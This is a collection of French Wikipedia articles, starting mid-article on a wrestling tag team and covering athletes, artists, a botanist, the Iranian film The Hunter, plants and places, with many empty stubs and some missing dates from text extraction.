Le au ', ils entrent respectivement dans le ' en et positions, mais se font éliminer par Gunther. Le à ', ils ne conservent pas leurs ceintures, battus par Gallus (Mark Coffey et Wolfgang) dans un ' qui inclut également Pretty Deadly et Chase U (Andre Chase et Duke Hudson). Le , Kofi Kingston souffre d'une blessure au bras et doit s'absenter pendant 5 mois.
Retour à ", départ de Big E et quintuples champions du monde (2023-...).
Le à ", lors du Draft, ils sont annoncés être officiellement transférés au show rouge par Shawn Michaels.
Le à "", Kofi Kingston fait son retour de blessure après 5 mois d'absence aux côtés de Xavier Woods et ensemble, les deux catcheurs battent les Viking Raiders.
Le au ', Kofi Kingston entre dans le ' en position, élimine Ludwig Kaiser avant d'être lui-même éliminé par Gunther.
Le à ', les deux catcheurs ne remportent pas les titres par équipes de ' et ', battus par Awesome Truth (The Miz et R-Truth) et A-Town Down Under (Austin Theory et Grayson Waller) dans un ' qui inclut également The Judgment Day (Damian Priest et Finn Bálor), #DIY (Johnny Gargano et Tommaso Ciampa) et New Catch Republic (Pete Dunne et Tyler Bate).
Le à ', pendant la célébration de leur décennie d'existence, Big E fait son retour et, dans l'attente d'avoir le feu vert pour revenir sur le ring, propose à ses deux frères de devenir leur manager, mais ils effectuent un ', car ils refusent son offre, l'excluent du groupe et ne forment désormais qu'un duo.
Le à ', ils redeviennent champions du monde par équipes, pour la cinquième fois, en rebattant les War Raiders. Le à ', ils ne conservent pas leurs ceintures, battus par The Judgment Day (Finn Bálor et JD McDonagh).
Palmarès.
Cette section présente les championnats et les récompenses remportés par le groupe durant sa période d'activité.

</doc>
<doc id="8979559" url="https://fr.wikipedia.org/wiki?curid=8979559" title="Auberge du pélican d'or">
Auberge du pélican d'or



</doc>
<doc id="8979560" url="https://fr.wikipedia.org/wiki?curid=8979560" title="Accrétion de cœur">
Accrétion de cœur



</doc>
<doc id="8979562" url="https://fr.wikipedia.org/wiki?curid=8979562" title="Éditions du pélican d'or">
Éditions du pélican d'or



</doc>
<doc id="8979563" url="https://fr.wikipedia.org/wiki?curid=8979563" title="Ordre du pélican d'or">
Ordre du pélican d'or



</doc>
<doc id="8979566" url="https://fr.wikipedia.org/wiki?curid=8979566" title="Georgie Viennet">
Georgie Viennet

Georgie Viennet, née le à Genève et morte le à Paris, est une chanteuse proche des milieux libertaires, et interprète notamment de chansons de Léo Ferré, Jean Ferrat, Francis Carco et Jacques Prévert. Elle fonde en 1959 l'Association française contre la peine de mort dont elle assure la présidence jusqu'à sa mort. 
Georgie Viennet, vue par Léo Ferré.
Léo Ferré a présenté ainsi Georgie Viennet, dans la préface d'un de ses disques : 

</doc>
<doc id="8979567" url="https://fr.wikipedia.org/wiki?curid=8979567" title="164215 Doloreshill">
164215 Doloreshill



</doc>
<doc id="8979568" url="https://fr.wikipedia.org/wiki?curid=8979568" title="Cœur solide">
Cœur solide



</doc>
<doc id="8979570" url="https://fr.wikipedia.org/wiki?curid=8979570" title="Modèle du cœur solide">
Modèle du cœur solide



</doc>
<doc id="8979576" url="https://fr.wikipedia.org/wiki?curid=8979576" title="Chanter (chanson)">
Chanter (chanson)



</doc>
<doc id="8979579" url="https://fr.wikipedia.org/wiki?curid=8979579" title="Edwin Mackinnon Liebert">
Edwin Mackinnon Liebert



</doc>
<doc id="8979582" url="https://fr.wikipedia.org/wiki?curid=8979582" title="Jo Benkow">
Jo Benkow

Jo Benkow, né Josef Elias Benkowitz le à Trondheim, et mort le à Oslo, est un politicien et écrivain norvégien, notable pour avoir été une personne importante du Høyre, et le président du Storting de 1985 à 1993.

</doc>
<doc id="8979585" url="https://fr.wikipedia.org/wiki?curid=8979585" title="In Love with Myself">
In Love with Myself

In Love With Myself est une chanson du DJ français David Guetta issue de son deuxième album, "Guetta Blaster" et sortie en single le , uniquement en France. Néanmoins, "In Love with Myself" s'est classée en Belgique, aux Pays-Bas, en Roumanie et en Suisse. La chanson est interprétée par JD Davis.
Format et pistes.
CD single

</doc>
<doc id="8979587" url="https://fr.wikipedia.org/wiki?curid=8979587" title="Alfred-Henri Bramtot">
Alfred-Henri Bramtot

Alfred-Henri Bramtot, né le à Paris et mort le à Garennes-sur-Eure, est un artiste peintre français.
Biographie.
Fils du chef du secrétariat de la Banque de France, Alfred-Henri Bramtot étudie à l'École des Beaux-Arts de Paris dans l'atelier de William Bouguereau. Il remporte le prix de Rome de peinture en 1879 avec "La Mort de Démosthène". Après son séjour romain à la villa Médicis, il commence une carrière de peintre et de décorateur. Après avoir concouru sans succès pour le décor de la mairie d'Arcueil-Cachan, il participe au décor de la salle du conseil municipal de la mairie des Lilas, sur le thème du suffrage universel en 1889, dont les esquisses sont conservées au Musée des Beaux-Arts de la Ville de Paris. En 1893, il fournit le carton au maître verrier Félix Gaudin pour le vitrail de sainte Catherine, devant orner l'une des baies de l'église Sainte-Catherine de Lille. Il participe régulièrement au Salon : il obtient une médaille de troisième classe en 1876 et est hors-concours après 1885.
Le , le "New York Times" signale à ses lecteurs son tableau "Les Amis de Job" exposé au Salon (Paris).
Il est l'auteur avec Georges Charles Victor Duval de dessins destinés aux émissions monétaires papier pour les colonies françaises.
Il était maître de dessin à l'École polytechnique.
Son atelier parisien se situait au rue Joseph-Bara à Paris.

</doc>
<doc id="8979590" url="https://fr.wikipedia.org/wiki?curid=8979590" title="Mont Minamikoma">
Mont Minamikoma

Le est une montagne culminant à d'altitude à la limite des villages d'Ōkuwa, district de Kiso et Iijima, district de Kamiina dans la préfecture de Nagano, région du Chūbu au Japon. Elle fait partie des monts Kiso.

</doc>
<doc id="8979592" url="https://fr.wikipedia.org/wiki?curid=8979592" title="Gael Andonian">
Gael Andonian



</doc>
<doc id="8979600" url="https://fr.wikipedia.org/wiki?curid=8979600" title="Andrea Belotti">
Andrea Belotti

Andrea Belotti, né le à Calcinate, est un footballeur international italien évoluant au poste d'avant-centre au Cagliari Calcio.
Biographie.
Jeunesse.
Andrea Belotti est né le à Calcinate en Italie. Il rejoint en 2003, à l'âge de dix ans, le club de Grumellese avant d'aller à l'UC AlbinoLeffe trois années plus tard. Il y fait ses classes pendant six ans avant de découvrir le monde professionnel. Le jeune Belotti est surnommé "Il Gallo" ("Le Coq" en français), surnom qui est dû à son admiration pour le coq qu'il tient de son enfance passée à courir derrière cet animal dans la ferme de sa mère mais aussi du nom de famille d'un ami d'enfance qui lui est cher.
Carrière professionnelle.
Premiers pas à AlbinoLeffe (2012-2013).
Le , Belotti fait ses débuts professionnels avec l'équipe A de l'UC AlbinoLeffe en Serie B. Rentré en jeu en cours de seconde période, le jeune joueur marque par la même son premier but en carrière malgré une défaite contre l'AS Livourne. Belotti joue quelques parts de matchs jusqu'à la fin de la saison, cumulant huit rencontres et deux buts. Cependant, AlbinoLeffe est relégué en Serie C à la fin de la saison.
Belotti profite de la relégation de son club formateur pour s'emparer de la place de titulaire d'attaque. Son sens du but le rend indispensable pour AlbinoLeffe et il finit l'exercice avec douze réalisations en Serie C. Sa saison flatteuse ne passe pas inaperçu et éveille l'intérêt de clubs de première division.
USC Palerme (2013-2015).
Le , Belotti rejoint, sous forme de prêt, le club de l'USC Palerme, qui évolue en Serie B. Il doit attendre la sixième journée de championnat pour porter le maillot sicilien et se montre décisif en offrant un but à Kyle Lafferty contre l'AS Bari. Le , Belotti marque son premier but "" sur le terrain du Brescia. Il s'adapte vite à l'effectif et trouve le chemin des filets à dix reprises alors qu'il n'est pas un titulaire incontestable, barré par Paulo Dybala et Franco Vázquez. Palerme retrouve l'élite en remportant le championnat de Serie B. Belotti est néanmoins désigné comme une sensation du championnat et les médias italiens voient en lui le nouvel espoir d'attaque de l'Italie. En , le club achète définitivement Belotti.
Le , Belotti découvre pour la première fois de sa carrière la Serie A en remplaçant Dybala contre la Sampdoria. Le , il inscrit ses premiers buts en Serie A en réalisant un doublé contre Naples et permet aux siens d'arracher un nul trois buts partout. Le reste de la saison est plus contrasté pour l'Italien qui, en concurrence avec plusieurs joueurs en attaque, est un remplaçant de luxe. Il n'est titularisé que neuf fois mais comptabilise six buts en fin de saison.
Torino FC (2015-2022).
Le , Belotti s'engage en faveur du Torino FC pour une somme de d'euros.
Belotti inscrit son premier but turinois le durant une victoire deux buts à zéro face au Bologne FC. Bien que son adaptation se fasse relativement lentement, Belotti prend ses marques et reçoit la confiance de son entraîneur Giampiero Ventura. En , il se démarque en réalisant un doublé contre Frosinone avant de récidiver un mois plus tard contre la Sampdoria. Le mois de mars le voit mettre fin au record d'invincibilité de l'emblématique gardien de la Juventus Turin, Gianluigi Buffon, mais le Torino chute lourdement à domicile sur le score de quatre buts à un. Sa deuxième partie de saison est beaucoup plus productive puisqu'il marque onze buts. Ainsi, Belotti totalise douze buts en Serie A à la fin de la saison et s'affirme comme un buteur régulier de Serie A.
Lors de la saison 2016-2017, Belotti confirme sa forme de la saison passée et gagne en confiance sous les ordres du nouvel entraîneur serbe Siniša Mihajlović qui lui donne plus de liberté tout en disciplinant comme il sait le faire, il se classe parmi les meilleurs canonniers de Serie A. Ses performances ne laissent pas indifférent de grands clubs européens, avec en tête le Real Madrid. En , il prolonge son contrat avec le Torino jusqu'en 2021 et une clause libératoire est fixée à cent millions d'euros. Le , alors que le Torino est mené 1-0 contre son ancien club de Palerme, Belotti réalise un triplé en l'espace de huit minutes et offre la victoire aux siens. Il clôt la saison avec 26 réalisations en Serie A, derrière Edin Džeko et Dries Mertens.
En parallèle, Belotti est convoqué pour la première fois en équipe d'Italie par le sélectionneur Ventura, celui qui l’entraînait la saison passée au Torino. Le , il vit sa première sélection durant un match amical contre la France. Le , jouant son premier match en tant que titulaire, Belotti trouve la marque face à la Macédoine, dans une rencontre comptant pour les . Le mois suivant, il est l'artisan de la victoire au Liechtenstein, réalisant un doublé et délivrant sa première passe décisive en sélection pour Ciro Immobile.
Pour la saison 2017-2018, Belotti est nommé capitaine du Torino. Néanmoins, l'attaquant ne parvient pas à réitérer ses performances de la saison passée en raison de nombreuses blessures et d'un manque de confiance devant le but. Belotti connait une période blanche d'un peu plus de deux mois, de septembre à , où le Torino ne gagne qu'à deux reprises. Ainsi, à la trêve hivernale, il compte quatre réalisations contre treize à la même période la saison passée. Il marque dix buts en 32 matchs de championnat, dont un triplé contre le FC Crotone, le club finissant à la neuvième place. En équipe nationale, Belotti reste muet devant le but lors des derniers rencontres éliminatoires pour la Coupe du monde 2018. Battue par la Suède en barrages, l'Italie est privée de mondial, une première depuis 1958. Après six matchs sans marquer, Belotti inscrit un but en amical contre l'Arabie saoudite.
AS Rome (2022-2024).
Le , l'international italien signe à l'AS Rome jusqu'à juin 2023 avec une option de 2 années supplémentaires selon des critères sportifs.
Prêt à l'ACF Fiorentina (2024).
Le , Belotti est prêté jusqu'en fin de saison à l'ACF Fiorentina.
Style de jeu.
Belotti fait preuve d'une efficacité certaine devant le but, pouvant marquer de plusieurs angles différents. À ses débuts à l'UC AlbinoLeffe, il joue comme milieu offensif ou en soutien de l'attaquant mais est vite placé en numéro 9, son poste de prédilection. Pour Emiliano Mondonico, qui l'a lancé dans le bain professionnel, Belotti est , pouvant . L'italien travaille sans cesse afin d'être au niveau. Il participe aux tâches défensives et son apport en la matière le rend polyvalent et précieux pour son équipe.
En Italie, sa célébration de but, où le joueur agite sa main sur son front, lui vaut le surnom de "" ("Le Coq").
Vie privée.
Andrea Belotti a épousé Giorgia Duro le 15 juin 2017 à Palerme. Ils ont une fille, Vittoria, née en 2021.

</doc>
<doc id="8979602" url="https://fr.wikipedia.org/wiki?curid=8979602" title="Jacob Sarratt">
Jacob Sarratt

Jacob Henry Sarratt est un joueur d'échecs anglais et un auteur né vers 1772 et mort le . Surnommé le « Professeur des échecs », il fut un des meilleurs joueurs anglais de la fin du au début du . Il introduisit en Angleterre la règle italienne qui veut que la partie soit nulle lorsqu'elle se termine par un pat.
Biographie.
Originaire de Londres, Sarratt rencontra sa première femme à Jersey et se maria à dix-huit ans. Il rencontra Philidor à Londres. Sa femme mourut en 1802 et il se remaria en 1804 avec une chanteuse, également de Jersey. Pendant la guerre avec la France, il devint lieutenant dans une compagnie et publia un pamphlet contre les crimes de guerre de Bonaparte.
Il fut un élève du maître des échecs Verdoni.

</doc>
<doc id="8979603" url="https://fr.wikipedia.org/wiki?curid=8979603" title="The Hunter (film, 2010)">
The Hunter (film, 2010)

 (titre original : , "Schekartschi") est un thriller dramatique germano-iranien réalisé par Rafi Pitts, sorti en 2010.
Le scénario est écrit par Rafi Pitts d'après une nouvelle de Bozorg Alavi. Le film met en vedette l'iranien Rafi Pitts qui joue le rôle de Ali, un père de famille, dont la femme et la fille seront tuées par la police lors d’une manifestation. Le titre original en (DIN 31635 : Šekārčī, Schekartschi) signifie « Chasseur ». Le film a été produit par . Le film a été tourné en persan en Iran. Il a été diffusé le au Festival de Berlin, où il fut projeté en compétition puis en France le à la Cinémathèque française et le en DVD en version originale sous-titrée.
Synopsis.
Début 2009, l'Iran où les manifestations demandant davantage de liberté individuelle et de démocratie sont réprimées par les forces de police d’une dictature paranoïaque du gouvernement corrompu de Mahmoud Ahmadinejad, le pays est en pleine campagne présidentielle. Le film commence sur la photographie d’un drapeau américain peint au sol que des motards des Gardiens de la Révolution à moto s’apprêtent à piétiner. Ali Khamenei, Guide Suprême des mollahs invective à la radio le président américain Obama pour le droit à la bombe nucléaire.
Téhéran est une capitale citadine bétonnée, tumultueuse, bruyante, polluée, coupée de la nature, surpeuplée d’individus se rendant aux salles d’attente impersonnelles et morbides du commissariat, d’où partent les sirènes nourrir le flux continuel de voitures sur les autoroutes tentaculaires qui crachent et ravalent les migrants qui rejoignent les usines le matin et leurs maisons le soir dans un mouvement de balancier en un vacarme permanent. Les mots se trouvent du côté de la loi (la police), du fonctionnariat (commissariat), des institutions (orphelinat), de la politique (enregistrement radiophonique du Guide Suprême). Le son appartient au menteur et au coupable qui impose le silence à la victime et à l’innocent. L’Iran a appris au peuple muselé à se taire. En famille, pas un échange verbal n’advient entre l’homme et sa femme ou sa fille. La communication familiale se fait par des signes non-verbaux.
Ali Alavi a une femme, Sara. Pendant son temps libre, il s’adonne à la chasse. Il ne donne pas l’impression d’être un délinquant sans éducation, mais sans que l’on en connaisse les raisons, Ali est emprisonné. Pour l’aider à tenir bon, Sara lui donne un enfant qui n’est pas le sien. Pieu mensonge ignoré par Ali qui sort de prison après sept ans de détention.
Pour nourrir sa petite famille, avec sa souillure d’ancien prisonnier, Ali est forcé d’accepter un travail de veilleur de nuit de sécurité dans une usine de Téhéran, où il subit la violence verbale du directeur. Travaillant le quart de nuit, il est obligé de vivre à contretemps de sa femme Sara – qui travaille de jour – et de sa fille de 7 ans, Saba, ce qui ne permet pas l’épanouissement du bonheur familial. La vie de famille n’a lieu que le week-end, le reste de la semaine, il ne voit guère sa famille. Ali compense son absence par des cadeaux. Malgré ses horaires de nuit, depuis sa prison, il lui semble ne jamais être là pour elles. Ali est un collègue agréable, un fils, mari et père aimant. Il profite de son temps libre pour chasser en forêt.
À midi, après son travail, Sara va chercher Saba à l’école en ville, où au même moment a lieu une manifestation pour la démocratie. La police réprime la manifestation qui tourne à l’émeute. Sara et Saba sont prises dans les feux croisés entre la police et des rebelles, et sont tuées.
En rentrant de la chasse, Ali trouve l’appartement désert. Ali attend Sara et Saba, mais l’appartement reste vide jusqu’au soir.
Quand il n'en peut plus d'attendre, il va voir les voisins, mais pas de nouvelles. La police trouve les coordonnées d’Ali dans le sac à main de Sara et l’appelle pour lui annoncer sa convocation à venir immédiatement au commissariat. Ali se rend au commissariat ou le chaos règne.
Après trois heures d'attente, un commissaire suspicieux fait subir à Ali un interrogatoire de questions privées. Il lui apprend qu'il y a eu une fusillade lors d'affrontements entre la police et les manifestants et que Sara, qui se trouvait la par hasard dans la trajectoire a été tuée par une balle perdue, mais on ne sait pas encore par qui, il faut attendre les résultats de dissections. Ali se rend à la morgue et reconnaît le corps de Sara. Ali comprend qu’elle a été abattue par la police qui l’informe n’avoir aucune information sur Saba, sa fille qui passe pour disparue.
Ali recherche sa fille dans un état de profond désespoir. Il parcourt les rues en montrant la photo de Saba aux passants, puis il va dans un orphelinat, sans succès. La police retrouve le corps de Saba tué par accident pendant l'échange de tirs avec les manifestants. Ali se rend à la morgue une seconde fois, et reconnaît le corps de sa fille. Ali comprend que l’État est responsable de la mort de sa femme et de sa fille unique. Les policiers enregistrent le meurtre comme un accident, car la vérité ne se dit pas dans cette société. Le mensonge verbal d’État oblige le chasseur au silence innocent déjà intériorisé en prison. Le mensonge silencieux devient parlé quand Ali ment à sa mère, quand il doit broder sur des vies disparues à jamais, raconter l’existence d’une femme et d’une fille qui lui sont devenues des rêves ne vivant plus que dans son esprit, qui devient fou. Le diktat politique crée une censure muette, un mensonge silencieux qui est nuisible et toxique, transformant les humains en monstres capables de se retourner contre leurs créateurs, humains prêts à « péter un câble » et à exploser.
Ali a tout perdu. Cette perte injuste le fait souffrir d’une douleur qui ne peut trouver le repos dans le pardon silencieux, mais dans la vengeance explosive. Ali ne trouve consolation que par la punition des responsables des répressions meurtrières : les policiers aux mains de Mahmoud Ahmadinejad.
Ali prend son fusil à lunette et va sur un pylône électrique près de l'autoroute urbaine. De nombreux véhicules civils passent, quand une voiture de police arrive, Ali tire tel un sniper et abat le conducteur puis l’officier de police qui tente de s’échapper.
Ali monte dans sa voiture et va à l’hôtel. Il prend sa voiture et va à la plage. Un hélicoptère de la police repère la voiture. Ali va dans une casse où l’homme vient changer sa voiture pour tromper ses poursuivants.
Ali monte dans sa nouvelle voiture et fuit en direction des forêts du Nord. Mais il est repéré par une voiture de police qui le prend en chasse. Le chasseur tueur de flics devient chassé, le chasseur devient proie.
Ali perd le contrôle de sa voiture qui part en tonneau et fini dans un talus. Ali court dans la forêt cherchant à se cacher parmi les arbres. Hassan et Nazem, deux policiers qui ne s'apprécient pas, et qui sont en confrontation verbale pourchassent Ali. Hassan et Nazem le repèrent, le poursuivent et le capturent.
Hassan et Nazem conduisent Ali en ville, mais ils se perdent dans la forêt. Un conflit se crée entre les deux policiers : l'agent de police veut tuer Ali pour se venger de ses deux collègues tués, mais le jeune policier veut le faire condamner par la justice.
Les policiers trouvent une maison non habitée. Le jeune policier garde Ali dans la maison, pendant que l’autre policier part chercher de l’aide. Le policier attache Ali à un mur et fait un feu de bois pour se chauffer du froid. Pendant que les renforts arrivent, le jeune policier donne son pistolet et la clef des menottes à Ali en lui disant : « tu as déjà tué deux policiers, tu peux en tuer un troisième », puis il s’enfuit en courant. Ali se libère et prend le pistolet. Le policier arrive et Ali lui prend son arme et ses vêtements avec lesquels il s'habille. Ali attache le policier au mur avec les menottes et sort de la maison, le jeune policier qui est trop loin pour reconnaître qu'Ali s’est habillé en policier, tire et tue Ali.
Autour du film.
En 2008, le bureau de censure accuse le film d'être fortement critique contre le régime du gouvernement iranien et d'être controversé et subversif. Il met six mois pour signer le visa d'autorisation de tourner en Iran avec l'obligation de tourner avec la présence permanente sur le lieu du tournage d'une personne de la censure. La campagne politique à la présidentielle a sans doute facilité l’autorisation de la part d’une commission de censure en attente d’un remaniement. Le bureau a autorisé la scène où Ali abat deux policiers, uniquement en faisant clairement apparaître qu'il était devenu fou. Mais la police n'a pas donné l'autorisation à l'équipe de tournage du film qui a alors duré quatre mois au lieu de 35 jours. La production s'est terminée quelques jours avant l'élection présidentielle iranienne de 2009. Pendant que Rafi Pitts présente le premier montage de son film à ses producteurs allemands à Berlin, la victoire du président sortant Mahmoud Ahmadinejad, cause des manifestations populaires et des émeutes violemment réprimées par la police. Rafi Pitts est allé recueillir les enregistrements sonores des témoins de la répression de la révolution verte en Iran et les a intégrés au film. Mais la censure revient sur sa décision et interdit la projection et la diffusion en Iran. Rafi Pitts souligne que les similitudes entre le film et les événements post-électoraux sont inhabituelles. La douleur de l’exil : Rafi Pitts ne peut plus aller en Iran car il risque d'être condamné par le gouvernement comme Jafar Panahi et Mohammad Rasoulof qui eux, sont interdits de tournage pendant vingt ans.
Récompenses et distinctions.
Le film a été présenté en première mondiale le au Festival de Berlin. Le jury a proposé le film pour l'Ours d'or mais le prix ne lui a pas été décerné.
Le film a aussi été proposé pour le Meilleur Film au Festival international du film de Mar del Plata.

</doc>
<doc id="8979604" url="https://fr.wikipedia.org/wiki?curid=8979604" title="Mordy (homonymie)">
Mordy (homonymie)

Mordy peut désigner:
Toponymie.
en , dans la voïvodie de Siedlce :

</doc>
<doc id="8979610" url="https://fr.wikipedia.org/wiki?curid=8979610" title="Jacob Henry Sarratt">
Jacob Henry Sarratt



</doc>
<doc id="8979614" url="https://fr.wikipedia.org/wiki?curid=8979614" title="Supercell">
Supercell

Supercell peut désigner :

</doc>
<doc id="8979619" url="https://fr.wikipedia.org/wiki?curid=8979619" title="Mervyn Wood">
Mervyn Wood

Mervyn Wood, né le à Kensington, en banlieue de Sydney, et mort le à Sydney, est un rameur australien.
Biographie.
Alors qu'il est cadet de la police, il se joint au club d'aviron de la police de Nouvelle Galles du Sud. Avec ses coéquipiers, il est sélectionné pour les Jeux olympiques de 1936. Son équipage est éliminé en repêchage.
Après les Jeux, il entre dans la police de Nouvelle Galles du Sud et, ses coéquipiers ayant arrêté de ramer, il se met au skiff. À l'issue de la Seconde Guerre mondiale, pendant laquelle il se joint à Royal Australian Air Force, il est champion d'Australie en 1946, 1947 et 1948. Aux Jeux olympiques de 1948, à Londres, il remporte toutes ses courses en skiff et gagne la médaille d'or (en éliminant au passage Jean Séphériades en quart de finale). 
À nouveau champion d'Australie en 1949, 1950, 1951 et 1952, il est le porte-drapeau de l'équipe australienne aux Jeux olympiques de 1952, à Helsinki. Il est battu en finale par le soviétique Yuri Tyukalov. 
Aux Jeux olympiques de 1956, il n'est pas sélectionné en skiff, cette place revenant au jeune Stuart Mackenzie, mais il concourt en deux de couple avec Murray Riley. Il est par ailleurs à nouveau porte-drapeau de l'équipe australienne. Wood et Riley finissent à la troisième place.
Mervyn Wood remporte aussi plusieurs médailles aux Jeux du Commonwealth de 1950, 1954 et 1958.
De 1977 à 1979, il est chef de la police de la Nouvelle Galles du Sud.

</doc>
<doc id="8979627" url="https://fr.wikipedia.org/wiki?curid=8979627" title="Glossaire de la protection des cultures">
Glossaire de la protection des cultures

Ce glossaire de la protection des cultures présente un répertoire de termes qui ont une signification particulière dans le domaine de la protection des cultures, ainsi que leur définition.

</doc>
<doc id="8979629" url="https://fr.wikipedia.org/wiki?curid=8979629" title="Hôtel Continental (Paris)">
Hôtel Continental (Paris)



</doc>
<doc id="8979631" url="https://fr.wikipedia.org/wiki?curid=8979631" title="Achyrocalyx">
Achyrocalyx

Achyrocalyx est un genre de plantes à fleurs de la famille des Acanthacées. Ce sont des plantes vivaces originaires de Madagascar.

</doc>
<doc id="8979632" url="https://fr.wikipedia.org/wiki?curid=8979632" title="Iecava (homonymie)">
Iecava (homonymie)



</doc>
<doc id="8979635" url="https://fr.wikipedia.org/wiki?curid=8979635" title="Arnošt Klimčík">
Arnošt Klimčík

Arnošt Klimčík, né le à Karviná et mort le , est un handballeur international tchécoslovaque.
Avec l'équipe de Tchécoslovaquie de handball masculin, il est sacré champion du monde en 1967 et médaillé d'argent aux Jeux olympiques d'été de 1972 à Munich.

</doc>
<doc id="8979637" url="https://fr.wikipedia.org/wiki?curid=8979637" title="Acanthostelma">
Acanthostelma

Acanthostelma est un genre de plantes à fleurs de la famille des Acanthacées.
Selon "Plants of the World Online", c'est un synonyme de "Crabbea".
Espèces.
Ce genre (monotypique) ne comporte qu'une seule espèce :

</doc>
<doc id="8979642" url="https://fr.wikipedia.org/wiki?curid=8979642" title="Kurt Schmid">
Kurt Schmid

Kurt Schmid, né le à Baar et mort le , est un rameur suisse.
Biographie.
Kurt Schmid est le fils du rameur .
Il participe aux Jeux olympiques de 1952, à Helsinki, en deux sans barreur avec Hans Kalt et remporte la médaille de bronze.
En 1960, il est à nouveau sélectionné pour les Jeux olympiques et finit à la sixième place en quatre sans barreur.

</doc>
<doc id="8979656" url="https://fr.wikipedia.org/wiki?curid=8979656" title="Eduardo Risso (aviron)">
Eduardo Risso (aviron)

Eduardo Risso, né le à Montevideo et mort le dans la même ville, est un rameur uruguayen.
Aux Jeux olympiques de 1948, à Londres, il remporte la médaille d'argent en skiff derrière l'Australien Mervyn Wood.

</doc>
<doc id="8979657" url="https://fr.wikipedia.org/wiki?curid=8979657" title="Sosthène Duclaux">
Sosthène Duclaux

Jean-Sosthène-Edmond Duclaux, ou encore Sosthène Duclaux (né le à Château-Gontier et mort le ) est un magistrat et botaniste français, connu pour ses contributions à l’étude de la flore de l’Ouest de la France, notamment en Mayenne, Anjou et Bretagne.
Biographie.
Jeunesse et formation.
Jean-Sosthène-Edmond Duclaux naît à Château-Gontier, fils de Jean-Laurent Duclaux, marchand orfèvre à Château-Gontier, succédant à son beau-père, originaire de Grenoble, et de Victoire-Aimée Perrotin. Après des études au Collège de Château-Gontier, il suit des cours de droit à la Faculté de Rennes. 
Bien que destiné à une carrière juridique, il se passionne rapidement pour les sciences naturelles, en particulier la botanique, qu’il considère comme son « "unique délassement" ». Entre 1812 et 1813, il suit assidûment les cours de botanique et de zoologie du professeur Jean-Vincent-Yves Degland à Rennes, avec qui il noue une relation durable. Il herborise régulièrement aux environs de Rennes, en compagnie d’autres étudiants en droit, dont Pontallier et Le Gall, avec qui il partage une passion pour la botanique.
Carrière juridique et passion botanique.
En 1814, après avoir terminé ses études de droit, Duclaux quitte Rennes pour Château-Gontier, tout en poursuivant ses herborisations. Il est nommé Substitut du procureur royal au tribunal civil de Château-Gontier en 1816, puis juge d’instruction en 1833, et enfin vice-président du tribunal civil de Laval en 1838 "Je n'ai pas, lui dit-il, toujours le loisir de parcourir la campagne et d'étudier les végétaux variés qui nous environnent. Il faut poursuivre des vagabonds, des fripons, les rebuts de la société, s'occuper d'une multitude d'actes et de procédures fort ennuyeuses. Il serait beaucoup plus agréable d'aller courir après l'Erica vagans que nous n'avons pas, ou même le Ranunculus sceleratus qui n'est pas rare!" Lettres à Guépin (Documents botaniques, p. 45)
Malgré ses obligations professionnelles, il consacre une grande partie de son temps libre à la botanique, explorant les environs de Château-Gontier, Laval, et d’autres régions de l’Ouest de la France. 
Il a suivi pendant une quarantaine d'années des recherches botaniques. Il a mené ses études avec une science et une conscience qui le firent unanimement apprécier par les botanistes.
Contributions scientifiques.
Duclaux est surtout connu pour ses récoltes et ses observations botaniques, qu’il consigne méticuleusement. Il découvre de nombreuses espèces rares ou peu documentées dans l’Ouest de la France, comme le "Reseda luteola" près de Saint-Malo, le "Salvia verbenaca" à Saint-Servan, ou encore le "Cochlearia danica" au Mont-Saint-Michel. 
En septembre 1821, Jean-Marie Bachelot de La Pylaie étant venu à Laval, Eugène Boullier et Sosthène Duclaux se joignirent à lui pour explorer les environs et particulièrement la localité de Changé. 
Il entretient une correspondance suivie avec plusieurs botanistes de son époque, notamment Jean-Vincent-Yves Degland, Jean-Baptiste-Pierre Guépin, Eugène Boullier, Auguste-Nicaise Desvaux et Alexandre Boreau, avec qui il échange des échantillons et des déterminations. Pendant qu'il est juge au Tribunal de Laval, il a visité le nord de l'Anjou, et a adressé fréquemment ses récoltes aussi rares à Jean-Baptiste-Pierre Guépin, auteur de la "Flore de Maine-et-Loire".
En 1838, il participe activement avec MM. Eugène Boullier et Hippolyte Le Tissier (bibliothécaire de Laval) à la rédaction du "Catalogue des plantes dicotylédones et monocotylédones qui croissent spontanément dans le département de la Mayenne", publié par une société de botanistes lavallois (Laval, 1838, in-12), réédité la même année en format in-8 . Il est l'un des auteurs du "Catalogue des plantes vasculaires de la Mayenne".
Héritage et postérité.
Duclaux lègue à sa mort ses herbiers, manuscrits et livres à la ville de Laval. Il a légué à sa mort au Musée des Sciences de Laval l'herbier de Jean-Baptiste Mougeot et C. Nestler sur "les plantes cryptogames des Vosges rhénanes" et l'herbier de F.G. Kneiff et W. Maercker sur "les mousses". Il était également membre du conseil municipal de Laval. Le conseil municipal de Laval salue en 1856 son legs à la ville, soulignant « les longues études spéciales et le mérite connu de M. Duclaux ».

</doc>
<doc id="8979660" url="https://fr.wikipedia.org/wiki?curid=8979660" title="Blanchard de la Musse">
Blanchard de la Musse



</doc>
<doc id="8979661" url="https://fr.wikipedia.org/wiki?curid=8979661" title="Sous-Groupe local">
Sous-Groupe local



</doc>
<doc id="8979662" url="https://fr.wikipedia.org/wiki?curid=8979662" title="Céloron de Blainville">
Céloron de Blainville



</doc>
<doc id="8979665" url="https://fr.wikipedia.org/wiki?curid=8979665" title="Defforey">
Defforey



</doc>
<doc id="8979666" url="https://fr.wikipedia.org/wiki?curid=8979666" title="Col Milner">
Col Milner

Le col Milner, en anglais "Milner Pass", est un col de montagne à d'altitude dans les montagnes Rocheuses, dans le Nord du Colorado aux États-Unis. Il est situé sur la ligne de partage des eaux, dans le Front Range, au sein du parc national de Rocky Mountain, sur la frontière entre le comté de Larimer et le comté de Grand.
Le col est franchi par l', aussi connue sous le nom de "Trail Ridge Road" allant d'Estes Park à Granby. Le col n'est toutefois pas le point le plus haut de la "Trail Ridge Road", qui culmine à à l'est du col au sein du parc national de Rocky Mountain.
Comme le reste de la "Trail Ridge Road", le col est en généralement fermé en hiver dès les premières chutes importantes de neige, habituellement en octobre et jusqu'à la réouverture de la route pour le Memorial Day, fin mai. Le col sépare les sources de la rivière Cache la Poudre, qui émerge du lac Poudre juste à l'est du col et plusieurs petits cours d'eau près de la source du fleuve Colorado vers l'ouest. La route près du col donne une vue panoramique vers les montagnes Never Summer à l'ouest.

</doc>
<doc id="8979670" url="https://fr.wikipedia.org/wiki?curid=8979670" title="Langues au Japon">
Langues au Japon

La langue officielle du Japon est "de facto" le japonais.
